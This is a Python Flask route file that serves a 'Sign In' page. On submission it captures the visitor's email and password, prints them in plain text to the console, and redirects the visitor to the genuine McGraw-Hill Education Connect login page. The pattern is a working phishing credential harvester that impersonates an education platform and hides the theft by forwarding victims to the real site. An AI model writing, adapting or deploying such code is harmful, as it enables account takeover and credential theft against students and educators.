from flask import Blueprint, render_template, request, redirect

routes = Blueprint("routes", __name__)

@routes.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        email = request.form.get("email", "").strip()
        password = request.form.get("password", "")

        # 🔍 Print to PyCharm console
        print("EMAIL:", email)
        print("PASSWORD:", password)

        # 🔁 Redirect after successful submit
        return redirect("https://accounts.mheducation.com/login?app=connect.mheducation.com&redirectUrl=https:%2F%2Fcaas.mheducation.com%2Fcaas%2Fheclr%2FlaunchConnect")

    return render_template("login.html", title="Sign In")
